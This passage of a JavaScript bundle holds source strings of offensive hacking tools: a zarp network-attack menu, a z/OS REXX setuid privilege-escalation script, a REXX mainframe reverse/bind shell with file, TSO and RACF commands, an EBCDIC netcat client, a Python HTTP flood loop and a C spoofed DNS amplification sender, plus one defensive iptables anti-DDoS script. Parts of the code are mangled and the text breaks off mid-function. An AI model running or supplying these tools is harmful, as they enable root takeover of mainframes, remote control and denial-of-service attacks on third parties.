# recheck that all sessions are down <br/> 			cnt = stream.get_session_count() <br/> 			if cnt <= 0: <br/> 			   # some libs dont clean up their own threads, so <br/> 			   # we need to hard quit those to avoid hanging; FIXME <br/> 			   _exit(1) <br/> 		elif choice == 1: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.poison]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.poison): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.poison[choice - 1]) <br/> 		elif choice == 2: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.dos]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.dos): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.dos[choice - 1]) <br/> 		elif choice == 3: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.sniffers]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.sniffers): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.sniffers[choice - 1]) <br/> 		elif choice == 4: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.scanner]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.scanner): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.scanner[choice - 1]) <br/> 		elif choice == 5: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.parameter]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.parameter): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.parameter[choice - 1]) <br/> 		elif choice == 6: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.services]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.services): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.services[choice - 1]) <br/> 		elif choice == 7: <br/> 			while True: <br/> 				choice = util.print_menu([x().which for x in loader.attacks]) <br/> 				if choice == 0: <br/> 					break <br/> 				elif choice == -1: <br/> 					pass <br/> 				elif choice > len(loader.attacks): <br/> 					continue <br/> 				else: <br/> 					stream.initialize(loader.attacks[choice - 1]) <br/> 		elif choice == 8: <br/> 			session_manager.menu() <br/> 		elif choice == -1: <br/> 			pass <br/>  <br/> # Application entry; dependency checks, etc. <br/> if __name__ == '__main__': <br/> 	# perm check <br/> 	if int(getuid()) > 0: <br/> 		util.Error('Please run as root.') <br/> 		_exit(1) <br/>  <br/> 	# check python version <br/> 	if version_info[1] < 7: <br/> 		util.Error('zarp must be run with Python 2.7.x.  You are currently using %s' <br/> 		% version) <br/> 		_exit(1) <br/>  <br/> 	# check for forwarding <br/> 	system = platform.system().lower() <br/> 	if system == 'darwin': <br/> 		if not getoutput('sysctl -n net.inet.ip.forwarding') == '1': <br/> 			util.Msg('IPv4 forwarding disabled. Enabling..') <br/> 			tmp = getoutput( <br/> 					'sudo sh -c 'sysctl -w net.inet.ip.forwarding=1'') <br/> 			if 'not permitted' in tmp: <br/> 				util.Error('Error enabling IPv4 forwarding.') <br/> 				exit(1) <br/> 	elif system == 'linux': <br/> 		if not getoutput('cat /proc/sys/net/ipv4/ip_forward') == '1': <br/> 			util.Msg('IPv4 forwarding disabled.  Enabling..') <br/> 			tmp = getoutput( <br/> 					'sudo sh -c 'echo '1' > /proc/sys/net/ipv4/ip_forward'') <br/> 			if len(tmp) > 0: <br/> 				util.Error('Error enabling IPv4 forwarding.') <br/> 				exit(1) <br/> 	else: <br/> 		util.Error('Unknown operating system. Cannot IPv4 forwarding.') <br/> 		exit(1) <br/>  <br/> 	# create temporary directory for zarp to stash stuff <br/> 	if exists('/tmp/.zarp'): <br/> 		util.init_app('rm -fr /tmp/.zarp') <br/> 	util.init_app('mkdir /tmp/.zarp') <br/>  <br/> 	main() <br/> ";
},{}],155:[function(require,module,exports){
module.exports="if  __argv.2 = '-h' | __argv.2 = '__ARGV.2' then do<br/>	say 'You must supply a setuid rexx script and a program you want to execute as root<br/>	say 'For example:'' __argv.1 '/usr/lpp/netview/v5r3/bin/cnmeunix' '/bin/sh'<br/>	exit 99<br/>end<br/>else if stem.ST_SETUID = 0 then do<br/>	say 'The first argument must be a REXX script with a SETUID'<br/>	exit 99<br/>end<br/><br/>say '[+]'' USERID() 'time to change your UID'<br/>flags.0 = 4<br/>flags.1 = __argv.1<br/>flags.2 = 'recurse'<br/>flags.3 = __argv.3<br/>flags.4 = stem.ST_UID<br/>why.0 = 1<br/>why.1 = '_BPC_SHAREAS=NO'<br/>say '[+] Spawning' __argv.2<br/>spawner = 'ADDRESS SYSCALL 'spawn '' __argv.2 '0 . flags. why.'<br/>INTERPRET spawner<br/>ADDRESS SYSCALL 'wait .'<br/>";
},{}],156:[function(require,module,exports){
module.exports="parse arg sockID, do_it <br/> parse var do_it do_it do_commands <br/> /* We have our socket and commands not lets do this */ <br/> 		SELECT <br/> 				WHEN do_it = 'sysinfo' THEN <br/> 				DO <br/> 					send_it = GET_OS_INFO() <br/> 					if verbose then say '[!] Sending OS Info' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'cat' THEN <br/> 				DO <br/> 					send_it = CAT_FILE(do_commands) <br/> 					if verbose then say '[!] Catting file' do_commands <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'cd' THEN <br/> 				DO <br/> 						if verbose then say '[!] CD to' do_commands <br/> 						send_it = NEWLINE||'cd to '||do_commands||NEWLINE <br/> 						pwd = do_commands <br/> 						terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'pwd' THEN <br/> 				DO <br/> 					send_it = NEWLINE||UPPER(pwd)||NEWLINE <br/> 					if verbose then say '[!] Sending PWD of:' pwd <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'ls' THEN <br/> 				DO <br/> 					IF do_commands = '' THEN <br/> 						send_it = LS(sockID,pwd) <br/> 					ELSE <br/> 						send_it = LS(sockID,do_commands) <br/> 					if verbose then say '[!] Sending LS COMMAND' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'cp' THEN <br/> 				DO <br/> 					send_it = CP(do_commands) <br/> 					if verbose then say '[!] Copying' do_commands <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'del' | do_it = 'delete' THEN <br/> 				DO <br/> 					send_it = DELETE(do_commands) <br/> 					if verbose then say '[!] Deleting' do_commands <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/>   <br/> 				WHEN do_it = 'unix' THEN <br/> 				DO <br/> 					send_it = UNIX_COMMAND(do_commands) <br/> 					if verbose then say '[!] Sending UNIX COMMAND' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'tso' | do_it = 'execute' THEN <br/> 				DO <br/> 					send_it = TSO_COMMAND(do_commands) <br/> 					if verbose then say '[!] Executing TSO Command' do_commands <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'ftp' THEN <br/> 				DO <br/> 					send_it = UPLOAD_FILE(do_commands) <br/> 					if verbose then say '[!] Using FTP to upload to' do_commands <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'getuid' THEN <br/> 				DO <br/> 					send_it = GET_UID() <br/> 					if verbose then say '[!] Sending UID' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'lsmem' THEN <br/> 				DO <br/> 					IF do_commands = '' THEN <br/> 						send_it = LS_MEMBERS(pwd) <br/> 					ELSE <br/> 						send_it = LS_MEMBERS(do_commands) <br/> 					if verbose then say '[!] Sending Members' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'ipconfig' | do_it = 'ifconfig' THEN <br/> 				DO <br/> 					send_it = GET_IP_INFO() <br/> 					if verbose then say '[!] Sending IP Info' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'racf' THEN <br/> 				DO <br/> 					send_it = GET_RACFDB() <br/> 					if verbose then say '[!] Sending RACF Database Dataset Name' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'users' THEN <br/> 				DO <br/> 					send_it = TSO_USERS() <br/> 					if verbose then say '[!] Sending TSO Users' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'help' THEN <br/> 				DO <br/> 					send_it = GET_HELP() <br/> 					if verbose then say '[!] Sending Help' <br/> 					terp = SOCKET('SEND',sockID, send_it||NEWLINE) <br/> 				END <br/> 				WHEN do_it = 'quit' | do_it = 'exit' THEN <br/> 				DO <br/> 					if verbose then say '[!] POP POP!' <br/> 					CALL DAVID_COULIER(0) /* jackalope */ <br/> 		 END <br/> 		 OTHERWISE /* The end of our options */ <br/> 				 if verbose then say '[!] Unrecognized Command' <br/> 		END /* End the select section */ <br/> 		terp = SOCKET('SEND',sockID, 'Enter command or 'help'> ') <br/> 	return 0 <br/>   <br/> INLIST: procedure <br/> arg sock, socklist <br/>   <br/> DO i = 1 to words(socklist) <br/> 	if words(socklist) = 0 <br/> 		then return 0 <br/> 	if sock = word(socklist,i) <br/> 		then return 1 <br/> end <br/>   <br/> return 0";
},{}],157:[function(require,module,exports){
module.exports="pwd = userid() <br/> NEWLINE = '25'x /* this is the hex equivalent of EBCDIC /n */ <br/> 	<br/> PARSE ARG type arghost argport <br/> 	<br/> /* Parse the arguments to see what we want to do */ <br/> SELECT <br/> WHEN type = 'L' THEN <br/> DO <br/> 	IF arghost = '' THEN <br/> 	DO <br/> 		if verbose then say '[+] You specified Listener without a port.' <br/> 		if verbose then say 'Using default: 12345' <br/> 		arghost = 12345 <br/> 	END <br/> if verbose then say '[+] Listening on port:' arghost <br/> party = MATT_DAEMON(arghost) <br/> END <br/> WHEN type = 'R' THEN <br/> DO <br/> 	IF arghost = '' | argport = '' THEN <br/> 	DO <br/> 		SAY '[!] You must pass a host and port when using Reverse' <br/> 		EXIT 4 <br/> 	END <br/> 	if verbose then say '[+] Sending shell to' arghost||':'||argport <br/>  ttime = RIVER_SONG(arghost,argport) /* Reverse Connection */ <br/> END <br/> OTHERWISE  /* Excellent */ <br/> 				PARSE SOURCE . . . . name . <br/> 				say 'No arguments passed! Run this as either server or client:' <br/> 				say 'Reverse Shell: '||name||' 'R IP PORT'' <br/> 				say 'Listener Shell: '||name||' 'L PORT'' <br/> 		EXIT 4 <br/> END /* End the arguments parser */ <br/> 	<br/> MATT_DAEMON: /* Starts the listener mode */ <br/> 		parse arg port <br/> 		terp = SOCKET('INITIALIZE','DAEMON',2) <br/> 		/* terp is short for z-terpreter */ <br/> 		parse var terp terp_rc . <br/> 		IF terp_rc <> 0 THEN <br/> 		DO <br/> 			if verbose then say '[!] Couldn't create socket' <br/> 			exit 1 <br/> 		END <br/> 		terp = Socket('GetHostId') <br/> 		parse var terp socket_rc MF_IP . <br/> 		terp = Socket('Gethostname') <br/> 		parse var terp src hostname <br/> 		/* setup the socket */ <br/> 		terp = SOCKET('SOCKET') <br/> 		parse var terp socket_rc socketID . <br/> 		if socket_rc <> 0 then <br/> 		DO <br/> 			if verbose then say '[!] Socket FAILED with info:' terp <br/> 			terp = SOCKET('TERMINATE') <br/> 			exit 1 <br/> 		END <br/> 	<br/> 		/* Setup: ASCII conversion, Reuse, no linger and non-blocking */ <br/> 	terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_REUSEADDR','ON') <br/> 		terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_LINGER','OFF') <br/> 	terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON') <br/> 		terp = Socket('IOCTL',socketID,'FIONBIO','ON') <br/> 		terp = Socket('BIND',socketID,'AF_INET' port MF_IP) <br/> 		parse var terp connect_rc rest <br/> 		if connect_rc <> 0 then <br/> 		DO <br/> 			if verbose then say '[!] Bind Failed:' terp <br/> 			CALL DAVID_COULIER(1) <br/> 		END <br/> 		if verbose then say '[!] IP' MF_IP 'and Port' port 'opened' <br/> 		terp = Socket('Listen',socketID,2) <br/> 		parse var terp src . <br/> 		if src > 0 then DAVID_COULIER(1) <br/> 		if verbose then say '[+] Server Ready' <br/> 	<br/> 		clients = '' <br/> 	 DO FOREVER /* Like, forever forever? A: Yes. */ <br/> 		terp = Socket('Select','READ' socketID clients 'WRITE' 'EXCEPTION') <br/> parse upper var terp 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin <br/> 	<br/> 		IF INLIST(socketID,readin) THEN /* see if we have a new socket */ <br/> 		DO <br/> 			terp = Socket('Accept',socketID) <br/> 			parse var terp src hackerID . hport hip <br/> 			if verbose then say '[!] Connection from '||hip||':'||hport <br/> 			clients = hackerID <br/> 			if verbose then say '[+] Hacker socket ID' clients <br/> 			terp = Socket('Socketsetstatus') <br/> 			parse var terp src . status <br/> 			if verbose then say '[+] Current Status' status <br/> 			terp = Socket('Setsockopt',hackerID,'SOL_SOCKET','SO_ASCII','ON') <br/> 			terp = Socket('Ioctl',hackerID,'FIONBIO','ON' ) <br/> 			terp = SOCKET('SEND',hackerID, 'Enter command or 'help'> ') <br/> 		END /* end new connection check */ <br/> /* If the READ is our hacker socket ID then do all the goodness */ <br/> /* since there's only one socket allowed, it will only be that id */ <br/> 		if readin = hackerID THEN <br/> 		DO <br/> 			ARNOLD = commando(hackerID) /* get the command */ <br/> 			if verbose then say '[+] Commands received: '||ARNOLD <br/> 			parse = CHOPPA(hackerID,ARNOLD) /* Get the cmd to da choppa! */ <br/> 		END <br/> 	 END /* OK not forever */ <br/> 	<br/> return 0";
},{}],158:[function(require,module,exports){
module.exports=" <br/> from select import select <br/> import socket <br/> import signal <br/> import sys <br/> import argparse  <br/>  <br/>  <br/> a2e = [ <br/> 			0,  1,  2,  3, 55, 45, 46, 47, 22,  5, 21, 11, 12, 13, 14, 15, <br/> 		 16, 17, 18, 19, 60, 61, 50, 38, 24, 25, 63, 39, 28, 29, 30, 31, <br/> 		 64, 79,127,123, 91,108, 80,125, 77, 93, 92, 78,107, 96, 75, 97, <br/> 		240,241,242,243,244,245,246,247,248,249,122, 94, 76,126,110,111, <br/> 		124,193,194,195,196,197,198,199,200,201,209,210,211,212,213,214, <br/> 		215,216,217,226,227,228,229,230,231,232,233, 74,224, 90, 95,109, <br/> 		121,129,130,131,132,133,134,135,136,137,145,146,147,148,149,150, <br/> 		151,152,153,162,163,164,165,166,167,168,169,192,106,208,161,  7, <br/> 		 32, 33, 34, 35, 36, 21,  6, 23, 40, 41, 42, 43, 44,  9, 10, 27, <br/> 		 48, 49, 26, 51, 52, 53, 54,  8, 56, 57, 58, 59,  4, 20, 62,225, <br/> 		 65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 85, 86, 87, <br/> 		 88, 89, 98, 99,100,101,102,103,104,105,112,113,114,115,116,117, <br/> 		118,119,120,128,138,139,140,141,142,143,144,154,155,156,157,158, <br/> 		159,160,170,171,172,173,174,175,176,177,178,179,180,181,182,183, <br/> 		184,185,186,187,188,189,190,191,202,203,204,205,206,207,218,219, <br/> 		220,221,222,223,234,235,236,237,238,239,250,251,252,253,254,255 <br/> 		] <br/>  <br/> e2a = [ <br/> 			0,  1,  2,  3,156,  9,134,127,151,141, 11, 11, 12, 13, 14, 15, <br/> 		 16, 17, 18, 19,157, 10,  8,135, 24, 25,146,143, 28, 29, 30, 31, <br/> 		128,129,130,131,132, 10, 23, 27,136,137,138,139,140,  5,  6,  7, <br/> 		144,145, 22,147,148,149,150,  4,152,153,154,155, 20, 21,158, 26, <br/> 		 32,160,161,162,163,164,165,166,167,168, 91, 46, 60, 40, 43, 33, <br/> 		 38,169,170,171,172,173,174,175,176,177, 93, 36, 42, 41, 59, 94, <br/> 		 45, 47,178,179,180,181,182,183,184,185,124, 44, 37, 95, 62, 63, <br/> 		186,187,188,189,190,191,192,193,194, 96, 58, 35, 64, 39, 61, 34, <br/> 		195, 97, 98, 99,100,101,102,103,104,105,196,197,198,199,200,201, <br/> 		202,106,107,108,109,110,111,112,113,114,203,204,205,206,207,208, <br/> 		209,126,115,116,117,118,119,120,121,122,210,211,212,213,214,215, <br/> 		216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231, <br/> 		123, 65, 66, 67, 68, 69, 70, 71, 72, 73,232,233,234,235,236,237, <br/> 		125, 74, 75, 76, 77, 78, 79, 80, 81, 82,238,239,240,241,242,243, <br/> 		 92,159, 83, 84, 85, 86, 87, 88, 89, 90,244,245,246,247,248,249, <br/> 		 48, 49, 50, 51, 52, 53, 54, 55, 56, 57,250,251,252,253,254,255 <br/> ] <br/>  <br/> def AsciiToEbcdic(s): <br/> 		if type(s) != type(''): <br/> 				raise 'Bad data', 'Expected a string argument' <br/>  <br/> 		if len(s) == 0:  return s <br/>  <br/> 		new = '' <br/>  <br/> 		for i in xrange(len(s)): <br/> 	#print s[i],':',ord(s[i]) <br/> 				new += chr(a2e[ord(s[i])]) <br/>  <br/> 		return new <br/>  <br/> def EbcdicToAscii(s): <br/> 		if type(s) != type(''): <br/> 				raise 'Bad data', 'Expected a string argument' <br/>  <br/> 		if len(s) == 0:  return s <br/>  <br/> 		new = '' <br/>  <br/> 		for i in xrange(len(s)): <br/> 	#print s[i],':',ord(s[i])	 <br/> 				new += chr(e2a[ord(s[i])]) <br/>  <br/> 		return new <br/>  <br/> ##Nice colours for us to use <br/> class bcolors: <br/> 		HEADER = '[95m' <br/> 		BLUE = '[94m' <br/> 		GREEN = '[92m' <br/> 		YELLOW = '[93m' <br/> 		RED = '[91m' <br/> 		ENDC = '[0m' <br/>  <br/> 		def disable(self): <br/> 				self.HEADER = '' <br/> 				self.BLUE = '' <br/> 				self.GREEN = '' <br/> 				self.YELLOW = '' <br/> 				self.RED = '' <br/> 				self.ENDC = '' <br/>  <br/> # catch the ctrl-c to exit and say something instead of Punt! <br/> def signal_handler(signal, frame): <br/> 				print 'Kick!' <br/> 				sys.exit(0) <br/>  <br/> signal.signal(signal.SIGINT, signal_handler) <br/> ################################################################# <br/>  <br/> #start argument parser <br/> parser = argparse.ArgumentParser(description='Script to communicate with netcat o <br/> n ''+OMVS (z/OS IBM Mainframe UNIX)',epilog='Damn you EBCDIC!') <br/> parser.add_argument('ip',help='The EBCDIC Server IP or Hostname',nargs='? <br/> ',default=''+None) <br/> parser.add_argument('port',help='The port to listen or connect') #Does this reall <br/> y ''+need an explanation <br/> parser.add_argument('-l','--listen',help='listen for incomming connections' <br/> , '+default='False,dest='server',action='store_true') <br/> parser.add_argument('-d','--d',help='do not display cool ass logo' <br/> , default=True,'+dest'='logo',action='store_false') <br/> args = parser.parse_args() <br/> results = parser.parse_args() # put the arg results in the variable results <br/>  <br/> if results.logo: <br/>  <br/>  <br/> if not results.server: <br/> 	try: <br/> 		MFsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br/> 		MFsock.connect( (results.ip, int(results.port)) ) <br/> 	except Exception, e: <br/> 				print  bcolors.RED + '[ERR] could not connect to ',result <br/> s.ip,':',''+results.port,'' + bcolors.ENDC <br/> 		print bcolors.RED + '',e,'' + bcolors.ENDC <br/> 		sys.exit(0) <br/>  <br/> else: <br/> 	if results.ip is not None: <br/> 		print bcolors.YELLOW + '[WARN] You defined IP address', results.ip, 'but ar <br/> e in listening mode. Ignored.' + bcolors.ENDC <br/> 	try: <br/> 		print bcolors.YELLOW + '[+] Listening on port', results.port + bcolors.ENDC <br/> 		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br/> 		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) <br/> 		server.bind((socket.gethostname(), int(results.port)))  <br/> 		server.listen(1) <br/> 		MFsock, address = server.accept() <br/> 	except Exception, e: <br/> 		 print bcolors.RED + '[ERR] could not open server on port:', results.port,' <br/> ' + bcolors.ENDC <br/> 		 print bcolors.RED + '',e,'' + bcolors.ENDC <br/> 		 sys.exit(0) <br/>  <br/> MFsock.setblocking(0) <br/> while(1): <br/> 	r, w, e = select( <br/> 		[MFsock, sys.stdin],  <br/> 		[],  <br/> 		[MFsock, sys.stdin]) <br/> 	try: <br/> 		buffer = MFsock.recv(128) <br/> 		while( buffer  != ''): <br/> 			ascii_out = EbcdicToAscii(buffer) <br/> 			print ascii_out, <br/> 			buffer = MFsock.recv(128) <br/> 								if(buffer == ''): <br/> 			break; <br/> 	except socket.error: <br/> 								pass <br/> 	 <br/> 	while(1): <br/> 		r, w, e = select([sys.stdin],[],[],0) <br/> 		if(len(r) == 0): <br/> 			break; <br/> 		c = raw_input() <br/> 		if(c == ''): <br/> 			break; <br/> 		c += '\n' <br/> 		command = AsciiToEbcdic(c) <br/> 		if(MFsock.sendall(command) != None): <br/> 			break; <br/>  <br/> ";
},{}],159:[function(require,module,exports){
module.exports="PARSE ARG rhost,  rport <br/> 		terp = SOCKET('INITIALIZE','CLIENT',2) <br/> 		/* terp is short for z-terpreter */ <br/> 		terp = SOCKET('SOCKET',2,'STREAM','TCP') <br/> 		parse var terp socket_rc socketID . <br/> 		if socket_rc <> 0 then <br/> 		do <br/> 			 if verbose then say '[!] Socket FAILED with info:'' terp <br/> 			 terp = SOCKET('TERMINATE') <br/> 			 exit 1 <br/> 		end <br/> 	terp = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON') <br/> 		/* Okay now we setup so it can do EBCDIC to ASCII conversion */ <br/> 		terp = SOCKET('SETSOCKOPT',socketID,'SOL_SOCKET','SO_ASCII','On') <br/> 		parse var terp ascii_rc . <br/> 		if ascii_rc <> 0 then <br/> 		do <br/> 			if verbose then say '[!] Setting ASCII mode failed:' terp <br/> 			exit 1 <br/> 		end <br/> 		terp = SOCKET('SOCKETSETSTATUS','CLIENT') <br/> 		if verbose then say '[+] Socket Status is' terp <br/> 		terp = SOCKET('CONNECT',socketID,'AF_INET' rport rhost) <br/> 		parse var terp connect_rc rest <br/> 		if connect_rc <> 0 then <br/> 		do <br/> 			if verbose then say '[!] Connection Failed:' terp <br/> 			CALL DAVID_COULIER(4) <br/> 		end <br/> 		if verbose then say '[!] Connection Established to', <br/> 												rhost||':'||rport <br/> 		terp = SOCKET('SEND',socketID, 'Enter command or 'help'> '') <br/>   <br/> 		DO FOREVER /* The never end storyyyyy */ <br/> 			ARNOLD = commando(socketID) /* get the command */ <br/> 			if verbose then say '[+] Commands received: '||ARNOLD <br/> 			parse = CHOPPA(socketID,ARNOLD) /* get the cmd to da choppa! */ <br/> 		END /* Atreyu! */ <br/> return 0";
},{}],160:[function(require,module,exports){
module.exports="#! /bin/bash <br/> while [ 1 ] ; <br/>  do <br/>  for ip in `lsof -ni | grep httpd | grep -iv listen | awk '{print $8 <br/> }' | cut -d : -f 2 | sort | uniq | sed s/'http->'//` ; <br/>  # the line above gets the list of all connections and connection <br/> attempts, and produces a list of uniq IPs <br/>  # and iterates through the list <br/> 	do <br/> 		noconns=`lsof -ni | grep $ip | wc -l`; <br/> 		# This finds how many connections there are from this particular IP address <br/> 		echo $ip : $noconns ; <br/> 		if [ '$noconns' -gt '10' ] ; <br/> 		# if there are more than 10 connections established or connecting <br/> from this IP <br/> 		then <br/> 			# echo More; <br/> 			# echo `date` '$ip has $noconns connections.  Total connections <br/> to prod spider:  `lsof -ni | grep httpd | grep -iv listen | wc -l`' >> <br/> /var/log/Ddos/Ddos.log <br/> 			# to keep track of the IPs uncomment the above two lines and <br/> make sure you can write to the appropriate place <br/> 			iptables -I INPUT -s $ip -p tcp -j REJECT --reject-with tcp-reset <br/> 			# for these connections, add an iptables statement to send <br/> resets on any packets recieved <br/> 		else <br/> 				# echo Less; <br/> 		fi; <br/> 	done <br/> sleep 60 <br/> done <br/> ";
},{}],161:[function(require,module,exports){
module.exports="import urllib <br/> from concurrent.futures import ThreadPoolExecutor <br/> from concurrent import futures <br/>  <br/> url = input('Enter URL with Protocol to attack (Ex: http://example.com) : ')  <br/>  <br/> def attack(url): <br/> 	html = htmlfile = urllib.urlopen(url) <br/> 	return str(html) <br/>  <br/>  <br/> with futures.ProcessPoolExecutor(max_workers=10) as executor: <br/> 	jobs = [] <br/> 	while True: <br/> 		job = executor.submit(attack, url) <br/> 		jobs.append(job) <br/>  <br/> 	# Get the completed jobs whenever they are done <br/> 	for job in futures.as_completed(jobs): <br/> 		html = job.result() <br/> 		print html <br/> ";
},{}],162:[function(require,module,exports){
module.exports=" <br/>  <br/> #include 'dns.h' <br/>  <br/> void error(char *str) <br/> { <br/> 	printf('%s\n',str); <br/> } <br/> { <br/> 	register long sum; <br/> 	unsigned short oddbyte; <br/> 	register short answer; <br/>  <br/> 	sum=0; <br/> 	while(nbytes>1) { <br/> 		sum+=*ptr++; <br/> 		nbytes-=2; <br/> 	} <br/> 	if(nbytes==1) { <br/> 		oddbyte=0; <br/> 		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr; <br/> 		sum+=oddbyte; <br/> 	} <br/>  <br/> 	sum = (sum>>16)+(sum & 0xffff); <br/> 	sum = sum + (sum>>16); <br/> 	answer=(short)~sum; <br/> 	 <br/> 	return(answer); <br/> } <br/>  <br/> { <br/> 	int lock = 0 , i; <br/> 	strcat((char*)host,'.'); <br/> 	for(i = 0 ; i < strlen((char*)host) ; i++)  <br/> 	{ <br/> 		if(host[i]=='.')  <br/> 		{ <br/> 			*dns++ = i-lock; <br/> 			for(;lock<i;lock++)  <br/> 			{ <br/> 				*dns++=host[lock]; <br/> 			} <br/> 			lock++; <br/> 		} <br/> 	} <br/> 	*dns++=0x00; <br/> } <br/>  <br/> // Creates the dns header and packet <br/> void dns_hdr_create(dns_hdr *dns) <br/> { <br/> 	dns->id = (unsigned short) htons(getpid()); <br/> 	dns->flags = htons(0x0100); <br/> 	dns->qcount = htons(1); <br/> 	dns->ans = 0; <br/> 	dns->auth = 0; <br/> 	dns->add = 0; <br/> } <br/>  <br/> void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p, <br/> 	unsigned char *dns_record) <br/> { <br/> 	// Building the DNS request data packet <br/> 	 <br/> 	unsigned char dns_data[128]; <br/> 	 <br/> 	dns_hdr *dns = (dns_hdr *)&dns_data; <br/> 	dns_hdr_create(dns); <br/> 	 <br/> 	unsigned char *dns_name, dns_rcrd[32]; <br/> 	dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)]; <br/> 	strcpy(dns_rcrd, dns_record); <br/> 	dns_format(dns_name , dns_rcrd); <br/> 	 <br/> 	query *q; <br/> 	q = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)]; <br/> 	q->qtype = htons(0x00ff); <br/> 	q->qclass = htons(0x1); <br/> 	 <br/> 	 <br/> 	// Building the IP and UDP headers <br/> 	char datagram[4096], *data, *psgram; <br/> 	memset(datagram, 0, 4096); <br/> 	 <br/> 	data = datagram + sizeof(iph) + sizeof(udph); <br/> 	memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) +1); <br/> 	 <br/> 	struct sockaddr_in sin; <br/> 	sin.sin_family = AF_INET; <br/> 	sin.sin_port = htons(dns_p); <br/> 	sin.sin_addr.s_addr = inet_addr(dns_srv); <br/> 	 <br/> 	iph *ip = (iph *)datagram; <br/> 	ip->version = 4; <br/> 	ip->ihl = 5; <br/> 	ip->tos = 0; <br/> 	ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query); <br/> 	ip->id = htonl(getpid()); <br/> 	ip->frag_off = 0; <br/> 	ip->ttl = 64; <br/> 	ip->protocol = IPPROTO_UDP; <br/> 	ip->check = 0; <br/> 	ip->saddr = inet_addr(trgt_ip); <br/> 	ip->daddr = sin.sin_addr.s_addr; <br/> 	ip->check = csum((unsigned short *)datagram, ip->tot_len); <br/> 	 <br/> 	udph *udp = (udph *)(datagram + sizeof(iph)); <br/> 	udp->source = htons(trgt_p); <br/> 	udp->dest = htons(dns_p); <br/> 	udp->len = htons(8+sizeof(dns_hdr)+(strlen(dns_name)+1)+sizeof(query)); <br/> 	udp->check = 0; <br/> 	 <br/> 	// Pseudoheader creation and checksum calculation <br/> 	ps_hdr pshdr; <br/> 	pshdr.saddr = inet_addr(trgt_ip); <br/> 	pshdr.daddr = sin.sin_addr.s_addr; <br/> 	pshdr.filler = 0; <br/> 	pshdr.protocol = IPPROTO_UDP; <br/> 	pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query)); <br/>  <br/> 	int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query); <br/> 	psgram = malloc(pssize); <br/> 	 <br/> 	memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr)); <br/> 	memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query)); <br/> 		 <br/> 	udp->check = csum((unsigned short *)psgram, pssize); <br/> 	 <br/> 	// Send data <br/> 	int sd = socket(AF_INET, 